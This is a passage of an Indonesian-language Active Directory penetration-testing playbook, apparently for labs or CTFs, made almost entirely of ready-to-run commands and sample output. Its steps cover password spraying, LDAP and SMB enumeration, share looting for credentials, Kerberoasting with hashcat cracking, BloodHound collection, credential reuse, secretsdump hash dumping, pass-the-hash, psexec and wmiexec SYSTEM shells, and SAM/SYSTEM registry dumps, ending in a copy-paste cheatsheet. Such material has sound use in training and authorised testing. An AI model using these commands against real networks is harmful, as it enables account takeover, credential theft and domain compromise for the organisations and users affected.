**OUTPUT BERHASIL ✅ — Admin credentials (Pwn3d!):**

text

```
SMB  10.10.10.10  445  DC01  [+] CORP\Administrator:Password123! (Pwn3d!)
```

➡️ **Langsung ke Fase 5 — Exploitation!**

**OUTPUT GAGAL ❌ — NT_STATUS_ACCOUNT_LOCKED_OUT:**

text

```
SMB  10.10.10.10  445  DC01  [-] CORP\alice:Password123! STATUS_ACCOUNT_LOCKED_OUT
```

➡️ **STOP SPRAYING SEKARANG!** Kamu sudah lock beberapa akun.

Bash

```
# Tunggu sesuai lockout duration yang kamu catat tadi
# Default: 30 menit. Buka timer, tunggu.
echo "Wait 35 minutes before trying again. Start: $(date)"

# Saat spray lagi, gunakan HANYA 1 password per session
nxc smb $TARGET -u ~/labs/ad/users/valid_users.txt -p 'NewPassword!' -d $DOMAIN
```

**OUTPUT GAGAL ❌ — Semua LOGON_FAILURE:**

text

```
SMB  10.10.10.10  445  DC01  [-] CORP\alice:Password123! STATUS_LOGON_FAILURE
```

➡️ Password list tidak cocok. Coba:

Bash

```
# Opsi 1: Cari hints dari SYSVOL/shares yang sudah di-loot
grep -ri "password\|pass\|pwd" ~/labs/ad/ 2>/dev/null

# Opsi 2: Password = username (sangat umum di CTF)
while read user; do
    echo "$user:$user"
    echo "$user:${user}123"
    echo "$user:${user}2024"
done < ~/labs/ad/users/valid_users.txt > ~/labs/ad/creds/user_as_pass.txt
nxc smb $TARGET -u ~/labs/ad/users/valid_users.txt -p ~/labs/ad/creds/user_as_pass.txt --no-brute -d $DOMAIN

# Opsi 3: Blank password test
nxc smb $TARGET -u ~/labs/ad/users/valid_users.txt -p '' -d $DOMAIN
```

---

## ═══════════════════════════════════════

## FASE 2: AUTHENTICATED ENUMERATION

## ═══════════════════════════════════════

> **Trigger:** Masuk sini jika sudah punya credentials valid dari Fase 1.  
> **Tujuan:** Peta domain lengkap — users, groups, computers, shares, SPNs, GPO, trusts.

### Langkah 2.1 — Validasi Credentials

Bash

```
# Validasi credentials yang ditemukan
nxc smb $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN
```

**OUTPUT BERHASIL ✅ — Standard user:**

text

```
SMB  10.10.10.10  445  DC01  [+] CORP\alice:Welcome2024!
```

(Tidak ada `Pwn3d!` = bukan local admin DC)

**OUTPUT BERHASIL ✅ — Admin/Pwn3d:**

text

```
SMB  10.10.10.10  445  DC01  [+] CORP\Administrator:Password123! (Pwn3d!)
```

➡️ `(Pwn3d!)` = local admin! Langsung ke **Fase 5 — Exploitation.**

**OUTPUT GAGAL ❌ — STATUS_LOGON_FAILURE:**

text

```
SMB  10.10.10.10  445  DC01  [-] CORP\alice:Welcome2024! STATUS_LOGON_FAILURE
```

➡️ Credentials salah. Periksa domain name, coba `--local-auth`:

Bash

```
# Coba local auth (bukan domain auth)
nxc smb $TARGET -u "$USERNAME" -p "$PASSWORD" --local-auth
```

---

### Langkah 2.2 — User Enumeration (Authenticated)

Bash

```
# Command 1: Impacket GetADUsers
impacket-GetADUsers \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -all \
    -dc-ip $TARGET \
    | tee ~/labs/ad/users/getadusers.txt

# Command 2: LDAP authenticated query
ldapsearch -x \
    -H "ldap://$TARGET" \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "$BASE_DN" \
    "(objectCategory=person)" \
    sAMAccountName userPrincipalName description memberOf pwdLastSet \
    | tee ~/labs/ad/ldap/auth_users.txt

# Command 3: NetExec
nxc smb $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN --users
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Querying domain DC01.corp.local
Name           Email                   PasswordLastSet
-------------- ----------------------- ---------------
Administrator                          2024-01-10
alice          alice@corp.local        2024-07-22
bob            bob@corp.local          2024-08-01
svc_backup     svc_backup@corp.local   2024-03-02
svc_sql        svc_sql@corp.local      2023-12-15   ← SPN candidate!
krbtgt                                 2024-01-10
```

Bash

```
# Extract dan sort usernames
grep "^sAMAccountName:" ~/labs/ad/ldap/auth_users.txt \
    | awk '{print $2}' \
    | sort -u \
    > ~/labs/ad/users/all_users.txt

echo "[*] Total users: $(wc -l < ~/labs/ad/users/all_users.txt)"

# PENTING: Cek description field — mungkin ada password!
grep "^description:" ~/labs/ad/ldap/auth_users.txt | grep -iv "^#"
```

---

### Langkah 2.3 — Group Enumeration

Bash

```
# Command 1: LDAP group query
ldapsearch -x \
    -H "ldap://$TARGET" \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "$BASE_DN" \
    "(objectClass=group)" \
    sAMAccountName member \
    | tee ~/labs/ad/groups/all_groups.txt

# Command 2: NetExec
nxc smb $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN --groups

# Command 3: Cek membership Domain Admins secara spesifik
ldapsearch -x \
    -H "ldap://$TARGET" \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "$BASE_DN" \
    "(&(objectClass=group)(sAMAccountName=Domain Admins))" \
    member
```

**OUTPUT BERHASIL ✅ — Domain Admins membership:**

text

```
dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
member: CN=Administrator,CN=Users,DC=corp,DC=local
member: CN=Alice Admin,CN=Users,DC=corp,DC=local   ← Siapa ini?!
```

**Groups yang HARUS dicek anggotanya:**

Bash

```
for group in "Domain Admins" "Enterprise Admins" "Backup Operators" \
             "Account Operators" "Server Operators" "DNS Admins" \
             "Remote Management Users"; do
    echo "=== $group ==="
    ldapsearch -x \
        -H "ldap://$TARGET" \
        -D "$USERNAME@$DOMAIN" \
        -w "$PASSWORD" \
        -b "$BASE_DN" \
        "(&(objectClass=group)(sAMAccountName=$group))" \
        member 2>/dev/null | grep "^member:"
done
```

---

### Langkah 2.4 — Computer Enumeration

Bash

```
# Command 1: LDAP computer query
ldapsearch -x \
    -H "ldap://$TARGET" \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "$BASE_DN" \
    "(objectCategory=computer)" \
    dNSHostName sAMAccountName operatingSystem operatingSystemVersion \
    | tee ~/labs/ad/computers/all_computers.txt

# Command 2: NetExec
nxc smb $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN --computers
```

**OUTPUT BERHASIL ✅:**

text

```
dn: CN=DC01,OU=Domain Controllers,DC=corp,DC=local
dNSHostName: DC01.corp.local
sAMAccountName: DC01$
operatingSystem: Windows Server 2019 Standard

dn: CN=WEB01,OU=Servers,DC=corp,DC=local
dNSHostName: WEB01.corp.local
sAMAccountName: WEB01$
operatingSystem: Windows Server 2019 Standard

dn: CN=WS01,OU=Workstations,DC=corp,DC=local
dNSHostName: WS01.corp.local
operatingSystem: Windows 10 Pro
```

Bash

```
# Extract hostnames dan tambahkan ke /etc/hosts
grep "dNSHostName:" ~/labs/ad/computers/all_computers.txt | awk '{print $2}' | while read host; do
    IP=$(nslookup $host $TARGET 2>/dev/null | grep "Address:" | tail -1 | awk '{print $2}')
    if [ -n "$IP" ]; then
        echo "$IP $host" | sudo tee -a /etc/hosts
    fi
done
```

---

### Langkah 2.5 — Share Enumeration (Authenticated)

Bash

```
# Command 1: NetExec dengan creds
nxc smb $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN --shares

# Command 2: smbmap
smbmap -H $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN -R

# Command 3: smbclient
smbclient -L //$TARGET/ -U "$DOMAIN/$USERNAME%$PASSWORD"

# Command 4: Scan semua komputer di domain untuk shares
nxc smb 10.10.10.0/24 -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN --shares 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Share yang sebelumnya tidak accessible kini terbuka:**

text

```
SMB  10.10.10.10  445  DC01  Share         Permissions
SMB  10.10.10.10  445  DC01  -----         -----------
SMB  10.10.10.10  445  DC01  ADMIN$        NO ACCESS
SMB  10.10.10.10  445  DC01  C$            NO ACCESS
SMB  10.10.10.10  445  DC01  HR_Private    READ           ← Sebelumnya NO ACCESS!
SMB  10.10.10.10  445  DC01  IPC$          READ ONLY
SMB  10.10.10.10  445  DC01  IT_Scripts    READ, WRITE    ← Writable!
SMB  10.10.10.10  445  DC01  NETLOGON      READ ONLY
SMB  10.10.10.10  445  DC01  SYSVOL        READ ONLY
```

Bash

```
# Loot semua share yang accessible
for share in HR_Private IT_Scripts NETLOGON SYSVOL; do
    echo "[*] Looting $share..."
    mkdir -p ~/labs/ad/shares/$share
    smbclient "//$TARGET/$share" \
        -U "$DOMAIN/$USERNAME%$PASSWORD" \
        -c "recurse ON; prompt OFF; mget *; exit" \
        --directory ~/labs/ad/shares/$share/ 2>/dev/null
done

# Cari credentials dalam semua file
grep -ri "password\|passwd\|secret\|credential\|key" ~/labs/ad/shares/ 2>/dev/null | head -50
find ~/labs/ad/shares/ -name "*.kdbx" -o -name "*.pfx" -o -name "*.key" 2>/dev/null
```

---

### Langkah 2.6 — SPN Enumeration (Kandidat Kerberoasting)

Bash

```
# Command 1: Impacket GetUserSPNs
impacket-GetUserSPNs \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip $TARGET \
    | tee ~/labs/ad/kerberos/spns.txt

# Command 2: LDAP query untuk SPN
ldapsearch -x \
    -H "ldap://$TARGET" \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "$BASE_DN" \
    "(servicePrincipalName=*)" \
    sAMAccountName servicePrincipalName \
    | grep -E "sAMAccountName:|servicePrincipalName:"
```

**OUTPUT BERHASIL ✅ — SPN ditemukan:**

text

```
ServicePrincipalName                 Name        MemberOf              PasswordLastSet
-----------------------------------  ----------  --------------------  ---------------
MSSQLSvc/DB01.corp.local:1433        svc_sql     Domain Users          2023-12-15
HTTP/WEB01.corp.local                svc_web     Domain Users          2023-11-20
```

➡️ **Kerberoasting! Request TGS tickets:**

Bash

```
# Request TGS hashes untuk semua SPN
impacket-GetUserSPNs \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip $TARGET \
    -request \
    -outputfile ~/labs/ad/kerberos/kerberoast_hashes.txt

# Verifikasi
cat ~/labs/ad/kerberos/kerberoast_hashes.txt

# Crack dengan hashcat
hashcat -m 13100 ~/labs/ad/kerberos/kerberoast_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    --force \
    -o ~/labs/ad/kerberos/kerberoast_cracked.txt

cat ~/labs/ad/kerberos/kerberoast_cracked.txt
```

**Output cracking berhasil:**

text

```
$krb5tgs$23$*svc_sql$CORP.LOCAL...:SqlPass2023!
```

Bash

```
# Update credentials jika lebih powerful
export USERNAME="svc_sql"
export PASSWORD="SqlPass2023!"
echo "$USERNAME:$PASSWORD" >> ~/labs/ad/evidence/found_creds.txt
```

➡️ Setelah dapat creds service account → lanjut ke **Fase 3 (BloodHound)** dan **Fase 4 (Privilege Escalation)**  
➡️ Untuk MSSQL credentials → `<a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>`

---

### Langkah 2.7 — Password Policy (Authenticated)

Bash

```
# Command 1: RPC authenticated
rpcclient -U "$DOMAIN\\$USERNAME%$PASSWORD" $TARGET -c "getdompwinfo"

# Command 2: LDAP query
ldapsearch -x \
    -H "ldap://$TARGET" \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "$BASE_DN" \
    -s base \
    minPwdLength lockoutThreshold lockoutDuration pwdHistoryLength

# Command 3: NetExec
nxc smb $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN --pass-pol
```

**OUTPUT BERHASIL ✅:**

text

```
min_password_length: 8
password_history: 24
lockout_threshold: 5
reset_lockout_count: 30
lockout_duration: 30
```

---

### Langkah 2.8 — GPO Enumeration (Cari GPP Credentials Authenticated)

Bash

```
# Command 1: LDAP GPO query
ldapsearch -x \
    -H "ldap://$TARGET" \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "$BASE_DN" \
    "(objectClass=groupPolicyContainer)" \
    displayName gPCFileSysPath \
    | tee ~/labs/ad/recon/gpos.txt

# Command 2: Search authenticated SYSVOL untuk GPP files
smbclient "//$TARGET/SYSVOL" \
    -U "$DOMAIN/$USERNAME%$PASSWORD" \
    -c "recurse ON; prompt OFF; mget *" 2>/dev/null

find ~/labs/ad/ -name "Groups.xml" -o -name "ScheduledTasks.xml" -o -name "Services.xml" 2>/dev/null \
    | while read f; do
        echo "=== $f ==="
        grep -i "cpassword\|password" "$f" 2>/dev/null
    done
```

---

### Langkah 2.9 — Trust Enumeration

Bash

```
# Command 1: LDAP trust query
ldapsearch -x \
    -H "ldap://$TARGET" \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "$BASE_DN" \
    "(objectClass=trustedDomain)" \
    cn trustDirection trustType flatName \
    | tee ~/labs/ad/recon/trusts.txt

# Command 2: NetExec
nxc smb $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN --trusted-for-delegation
```

**OUTPUT BERHASIL ✅ — Trust ditemukan:**

text

```
cn: child.corp.local
trustDirection: 3      ← Bidirectional trust!
trustType: 2
flatName: CHILD
```

> ⚠️ Jika ada trust → ada kemungkinan **cross-domain attack**. Catat ini untuk `<a href="/docs/ad-acl-abuse" class="text-[#00b4d8] hover:underline font-mono font-semibold">38_ad_acl_abuse_workflow.md</a>` dan `[🔥 Workflow 37 — Kerberoasting & AS-REP Roasting](/docs/kerberoasting-asreproasting)`

---

## ═══════════════════════════════════════

## FASE 3: BLOODHOUND DATA COLLECTION

## ═══════════════════════════════════════

> **Trigger:** Sudah punya credentials valid dan cukup informasi untuk dianalisis.  
> **Tujuan:** Kumpulkan data untuk BloodHound yang akan menunjukkan attack path ke Domain Admin.

### Langkah 3.1 — BloodHound CE Python Collection

Bash

```
# Command 1: Install bloodhound-ce-python jika belum ada
sudo apt update
sudo apt install -y bloodhound-ce-python 2>/dev/null || \
    pip install bloodhound-ce 2>/dev/null || \
    pipx install bloodhound-ce

# Verifikasi
bloodhound-ce-python --help

# Command 2: Collect ALL data
bloodhound-ce-python \
    -d $DOMAIN \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -dc $TARGET \
    -c All \
    --zip \
    -o ~/labs/ad/bloodhound/

# Command 3: Jika DNS bermasalah, tambahkan nameserver
bloodhound-ce-python \
    -d $DOMAIN \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -dc $TARGET \
    -ns $TARGET \
    -c All \
    --zip \
    -o ~/labs/ad/bloodhound/
```

**OUTPUT BERHASIL ✅:**

text

```
INFO: Found AD domain: corp.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.corp.local
INFO: Found 1 domains
INFO: Found 37 users
INFO: Found 19 groups
INFO: Found 18 computers
INFO: Found 6 gpos
INFO: Found 12 ous
INFO: Found 2 trusts
INFO: Starting computer enumeration
INFO: Done
INFO: Compressing output
INFO: Output ZIP saved to: /root/labs/ad/bloodhound/20240710_bloodhound.zip
```

Bash

```
# Simpan dan backup
ls ~/labs/ad/bloodhound/
cp ~/labs/ad/bloodhound/*.zip ~/labs/ad/evidence/

echo "[*] BloodHound collection complete. Import ke BloodHound CE UI."
echo "[*] → File 36: <a href="/docs/ad-bloodhound" class="text-[#00b4d8] hover:underline font-mono font-semibold">36_ad_bloodhound_workflow.md</a>"
```

**OUTPUT GAGAL ❌ — DNS resolution error:**

text

```
ERROR: Could not resolve DC hostname
```

Bash

```
# Pastikan /etc/hosts sudah diupdate
cat /etc/hosts | grep $TARGET

# Coba dengan IP langsung
bloodhound-ce-python \
    -d $DOMAIN \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -dc $TARGET \
    -ns $TARGET \
    -c DCOnly \
    --zip
```

**OUTPUT GAGAL ❌ — Kerberos clock skew error:**

text

```
KRB_AP_ERR_SKEW: Clock skew too great
```

Bash

```
# Cek perbedaan waktu
date
nmap -Pn -p 445 --script smb2-time $TARGET

# Sinkronisasi dengan DC (jika diizinkan di lab)
sudo ntpdate -q $TARGET
sudo ntpdate $TARGET  # Jika butuh sinkronisasi
```

---

## ═══════════════════════════════════════

## FASE 4: CREDENTIAL REUSE KE SERVICE LAIN

## ═══════════════════════════════════════

> Setiap kali dapat credentials AD, TEST KE SEMUA SERVICE! AD credentials sering berlaku di service lain.

### Langkah 4.1 — Test Cross-Service Credential Reuse

Bash

```
# Test credentials ke semua service yang mungkin aktif
# (jalankan semuanya, lihat mana yang connect)

# WinRM (port 5985) - Windows remote management
nxc winrm $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN

# SSH (port 22) - sering ada di lab hybrid
nxc ssh $TARGET -u "$USERNAME" -p "$PASSWORD"

# RDP (port 3389)
nxc rdp $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN

# FTP (port 21)
nxc ftp $TARGET -u "$USERNAME" -p "$PASSWORD"

# MSSQL (port 1433)
nxc mssql $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN

# Test ke semua komputer di domain sekaligus
nxc smb 10.10.10.0/24 -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN 2>/dev/null \
    | grep "\[+\]"
```

**OUTPUT BERHASIL ✅ — WinRM accessible (Pwn3d!):**

text

```
WINRM  10.10.10.10  5985  DC01  [+] CORP\alice:Welcome2024! (Pwn3d!)
```

Bash

```
# Spawn interactive WinRM shell
evil-winrm -i $TARGET -u "$USERNAME" -p "$PASSWORD"

# Di dalam evil-winrm:
*Evil-WinRM* PS C:\Users\alice\Documents> whoami
corp\alice
*Evil-WinRM* PS C:\Users\alice\Documents> whoami /priv
# Cek privileges untuk privesc → <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>
*Evil-WinRM* PS C:\Users\alice\Documents> net user alice /domain
```

**OUTPUT BERHASIL ✅ — Credentials valid di komputer lain:**

text

```
SMB  10.10.10.20  445  WEB01  [+] CORP\alice:Welcome2024! (Pwn3d!)
```

➡️ **Lateral movement opportunity!** Alice adalah local admin di WEB01.

Bash

```
# Masuk ke WEB01
evil-winrm -i 10.10.10.20 -u "$USERNAME" -p "$PASSWORD"
# atau
impacket-psexec "$USERNAME:$PASSWORD@10.10.10.20"

# → ke <a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a> untuk detail
```

**Cross-Service Credential Testing Chart:**

text

```
AD Credentials
     │
     ├──→ Port 5985 (WinRM)  → evil-winrm
     ├──→ Port 22   (SSH)    → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     ├──→ Port 3389 (RDP)    → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>
     ├──→ Port 21   (FTP)    → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
     ├──→ Port 389  (LDAP)   → <a href="/docs/ldap" class="text-[#00b4d8] hover:underline font-mono font-semibold">11_ldap_workflow.md</a>
     ├──→ Port 1433 (MSSQL)  → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
     ├──→ Port 3306 (MySQL)  → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
     └──→ Komputer lain      → <a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>
```

---

## ═══════════════════════════════════════

## FASE 5: EXPLOITATION PATHS

## ═══════════════════════════════════════

### PATH A — Pass-The-Hash (Jika Punya NTLM Hash)

Bash

```
# Dump NTLM hashes jika punya admin creds
impacket-secretsdump "$USERNAME:$PASSWORD@$TARGET"
# atau
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$TARGET"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
alice:1104:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Dumping cached domain logon information
CORP.LOCAL/svc_backup:$DCC2$10240#svc_backup#...
```

Bash

```
# Simpan hashes
export NTLM_HASH="aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881"
echo "Administrator:$NTLM_HASH" >> ~/labs/ad/evidence/ntlm_hashes.txt

# Pass-The-Hash attacks
nxc smb $TARGET -u "Administrator" -H "$NTLM_HASH"
nxc winrm $TARGET -u "Administrator" -H "$NTLM_HASH"

# PTH dengan impacket
impacket-psexec "Administrator@$TARGET" -hashes "$NTLM_HASH"
impacket-wmiexec "Administrator@$TARGET" -hashes "$NTLM_HASH"

# Crack NTLM hash offline
hashcat -m 1000 ~/labs/ad/evidence/ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### PATH B — PsExec / WMIExec (Jika Dapat Admin Credentials)

Bash

```
# Method 1: PsExec (SYSTEM shell, noisy - buat service baru)
impacket-psexec "$USERNAME:$PASSWORD@$TARGET"

# Method 2: WMIExec (lebih stealth, tidak buat service)
impacket-wmiexec "$USERNAME:$PASSWORD@$TARGET"

# Method 3: SMBExec (sangat stealth, tidak upload binary)
impacket-smbexec "$USERNAME:$PASSWORD@$TARGET"
```

**OUTPUT BERHASIL ✅ — PsExec berhasil:**

text

```
[*] Requesting shares on 10.10.10.10.....
[*] Found writable share ADMIN$
[*] Uploading file pwned.exe
[*] Opening SVCManager on 10.10.10.10.....
[*] Creating service...
C:\Windows\system32> whoami
nt authority\system
```

**OUTPUT GAGAL ❌ — PsExec: Access Denied:**

text

```
[-] SMB SessionError: STATUS_ACCESS_DENIED
```

➡️ User bukan local admin, atau UAC blocking.

Bash

```
# Coba WMIExec (bypass UAC lebih sering)
impacket-wmiexec "$USERNAME:$PASSWORD@$TARGET"

# Cek privilege level
nxc smb $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN -x "whoami /priv"
```

---

## ═══════════════════════════════════════

## FASE 6: POST-EXPLOITATION & PIVOT

## ═══════════════════════════════════════

### Setelah Dapat Shell — Information Gathering untuk Lateral Movement

Bash

```
# Di Windows shell (cmd atau PowerShell):

# 1. Identifikasi posisi
C:\> whoami /all
C:\> whoami /priv
C:\> net localgroup administrators

# 2. Network discovery untuk target berikutnya
C:\> ipconfig /all
C:\> net view /domain
C:\> arp -a
C:\> net use

# 3. Cari credentials lain
C:\> reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
C:\> cmdkey /list

# 4. Dump SAM/SYSTEM untuk offline cracking
C:\> reg save HKLM\SAM C:\sam.bak
C:\> reg save HKLM\SYSTEM C:\system.bak
# Download lalu:
# impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# 5. Scheduled tasks dan services untuk persistence/privesc
C:\> schtasks /query /fo LIST /v | findstr "Task Name\|Run As"
C:\> sc query type= all

# 6. Cari password di file sistem
C:\> findstr /si password *.txt *.xml *.config *.ini 2>nul
C:\> dir /s /b "*.kdbx" "*.pfx" "id_rsa" 2>nul
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`KDC_ERR_PREAUTH_FAILED`|Password salah / pre-auth gagal|Cek username/password format|
|`KRB_AP_ERR_SKEW`|Clock attacker ≠ DC|`sudo ntpdate $TARGET` atau sinkronisasi manual|
|`clock skew too great`|Sama dengan atas|`timedatectl` → cek waktu|
|`KDC_ERR_C_PRINCIPAL_UNKNOWN`|Username tidak ada di domain|Verifikasi username dengan Kerbrute|
|`KDC_ERR_WRONG_REALM`|Domain name salah|Pastikan `$DOMAIN` sudah benar|
|`NT_STATUS_ACCESS_DENIED`|Anonymous/auth action ditolak|Gunakan credentials atau metode lain|
|`NT_STATUS_LOGON_FAILURE`|Username/password salah|Revalidate, cek local vs domain auth|
|`NT_STATUS_ACCOUNT_LOCKED_OUT`|Terlalu banyak spray|STOP! Tunggu lockout duration|
|`ldap_bind: Invalid credentials`|Bind DN format salah|Gunakan `user@domain` bukan `domain\user`|
|`ldapsearch` tidak return data|Base DN/filter salah|Periksa RootDSE dulu|
|`Can't contact LDAP server`|LDAP port closed/filtered|`nmap -p 389 $TARGET` untuk verifikasi|
|`SPNEGO/Kerberos error`|FQDN tidak resolve|`echo "$TARGET domain.local" >> /etc/hosts`|
|`nxc timeout`|Network/DNS/routing issue|`ping`, `nmap`, cek routing|
|Kerbrute semua invalid|Domain/DC salah atau DNS issue|Periksa realm/domain/DC resolution|
|`GetNPUsers` tidak dapat hash|Tidak ada pre-auth-disabled account|Lanjut ke spraying|
|`clock skew too great`|Kerberos time issue|**CEK JAM DULU sebelum blame tooling**|
|BloodHound CE import gagal|Collector/UI mismatch|Pastikan pakai `bloodhound-ce-python`|
|`impacket-GetADUsers` format error|Argumen order|Lihat `-h` untuk format yang benar|
|`STATUS_PASSWORD_MUST_CHANGE`|First login force change|`smbpasswd -r $TARGET -U $USERNAME`|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Suspect AD Environment
│
├─ FASE 0: Konfirmasi DC
│   ├─ Port 88+389+445+3268 → STRONG AD indicator
│   ├─ nxc smb → domain name, OS, signing status
│   └─ LDAP RootDSE → Base DN
│
├─ FASE 1: Unauthenticated Enum
│   ├─ SMB Null Session
│   │   ├─ [SYSVOL readable] → Cari GPP creds → FASE 2
│   │   └─ [ACCESS_DENIED] → Coba LDAP/RPC/Kerbrute
│   ├─ LDAP Anonymous → User/Group list
│   ├─ RPC Null Session → User list, password policy
│   ├─ enum4linux-ng → Comprehensive baseline
│   ├─ Kerbrute → Valid username confirmation
│   └─ AS-REP Roasting → Hash → Crack → FASE 2
│
├─ [Jika masih tidak punya creds]
│   └─ Password Spraying (cek lockout policy DULU!)
│
├─ FASE 2: Authenticated Enum
│   ├─ GetADUsers → Full user list
│   ├─ LDAP Groups → Domain Admins membership
│   ├─ LDAP Computers → Network map
│   ├─ Share Enum → Loot files
│   ├─ SPN Enum → Kerberoasting → More creds
│   └─ Trust Enum → Cross-domain paths
│
├─ FASE 3: BloodHound Collection
│   └─ bloodhound-ce-python → ZIP → Import → FASE 5 (File 36)
│
├─ FASE 4: Credential Reuse
│   ├─ WinRM → evil-winrm
│   ├─ SSH → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
│   ├─ MSSQL → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
│   └─ Komputer lain → <a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>
│
└─ FASE 5: Exploitation
    ├─ PTH → nxc/impacket dengan hash
    ├─ PsExec/WMIExec → SYSTEM shell
    └─ Post-exploitation → Collect info → Pivot
         └─ → <a href="/docs/ad-bloodhound" class="text-[#00b4d8] hover:underline font-mono font-semibold">36_ad_bloodhound_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.10.10"
export DOMAIN="corp.local"
export DC_HOSTNAME="DC01"
export BASE_DN="DC=corp,DC=local"
export USERNAME=""; export PASSWORD=""
mkdir -p ~/labs/ad/{recon,users,groups,computers,shares,ldap,kerberos,bloodhound,evidence,creds}

# === CONFIRM DC ===
nmap -Pn -p 53,88,135,389,445,464,636,3268,3269 $TARGET
nxc smb $TARGET
ldapsearch -x -H "ldap://$TARGET" -s base -b "" namingContexts

# === UNAUTHENTICATED ===
smbclient -N -L //$TARGET/                              # List shares
nxc smb $TARGET -u '' -p '' --shares                   # Anonymous shares
enum4linux-ng -A $TARGET                                # All-in-one
rpcclient -U "" -N $TARGET -c "enumdomusers;getdompwinfo;quit"  # RPC null

# Kerbrute + AS-REP
kerbrute userenum --dc $TARGET -d $DOMAIN users.txt
impacket-GetNPUsers "$DOMAIN/" -dc-ip $TARGET -usersfile users.txt -format hashcat -no-pass

# Spray (CEK LOCKOUT DULU!)
nxc smb $TARGET -u users.txt -p passwords.txt --continue-on-success -d $DOMAIN

# === AUTHENTICATED ===
nxc smb $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN  # Validate
impacket-GetADUsers "$DOMAIN/$USERNAME:$PASSWORD" -all -dc-ip $TARGET
ldapsearch -x -H "ldap://$TARGET" -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "$BASE_DN" "(objectCategory=person)" sAMAccountName description memberOf
nxc smb $TARGET -u "$USERNAME" -p "$PASSWORD" -d $DOMAIN --shares --users --groups

# Kerberoasting
impacket-GetUserSPNs "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip $TARGET -request -outputfile kerb.hash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt

# === BLOODHOUND ===
bloodhound-ce-python -d $DOMAIN -u "$USERNAME" -p "$PASSWORD" -dc $TARGET -ns $TARGET -c All --zip

# === EXPLOITATION ===
evil-winrm -i $TARGET -u "$USERNAME" -p "$PASSWORD"         # WinRM
impacket-psexec "$USERNAME:$PASSWORD@$TARGET"               # PsExec (SYSTEM)
impacket-wmiexec "$USERNAME:$PASSWORD@$TARGET"              # WMIExec (stealth)
impacket-secretsdump "$USERNAME:$PASSWORD@$TARGET"          # Dump hashes
impacket-psexec "Administrator@$TARGET" -hashes "$NTLM_HASH"  # PTH
```

---

